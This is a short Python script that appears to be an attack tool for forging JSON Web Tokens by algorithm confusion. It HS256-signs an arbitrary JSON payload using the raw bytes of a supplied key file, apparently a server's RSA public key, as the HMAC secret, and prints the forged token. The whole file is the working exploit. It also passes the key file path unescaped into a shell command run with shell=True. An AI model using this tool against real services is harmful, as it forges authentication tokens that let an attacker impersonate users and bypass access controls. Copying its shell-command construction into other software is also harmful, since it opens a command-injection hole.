#!/usr/bin/env python

import sys, subprocess, jwt, base64, argparse, json, binascii


def get_hmac(keyfile, token, debug = True):
	keyhex = subprocess.check_output("""cat {} | xxd -p | tr -d \"\\n\"""".format(keyfile), shell=True)
	keyhex = keyhex.replace('\n', '')
	if debug:
		print("[*] HexKey:")
		print(keyhex)
	cmd = """openssl dgst -sha256 -mac HMAC -macopt hexkey:{}""".format(keyhex)
	p = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
	hmac, stderr = p.communicate(input=token)
	hmac = hmac.replace('\n', '')
	return hmac

def get_sign(hmac):
	return base64.urlsafe_b64encode(binascii.a2b_hex(hmac)).replace('=','')


if __name__ == '__main__':

	parser = argparse.ArgumentParser(description='Process some integers.')
	# parser.add_argument('-t', '--token', help='RSA JSON WebToken (Header + Payload) Without Sign')
	parser.add_argument('-d', '--data', help='Payload (JSON encoded)')
	parser.add_argument('-k', '--keyfile', help='Path to keyfile')


	args = parser.parse_args()
	
	if not args.data:
		sys.exit("Payload is required")

	if not args.keyfile:
		sys.exit("Keyfile is required")

	# Change header
	body = json.loads(args.data)
	token = '.'.join(jwt.encode(body, 'dummy').split('.')[0:2])
	

	hmac = get_hmac(args.keyfile, token)

	sign = get_sign(hmac)

	print("[+] HMAC SHA-256: {}".format(hmac))
	print("[+] JWT Sign: {}".format(sign))
	print("")
	print("[+] JWT Token:")
	print("{}.{}".format(token, sign))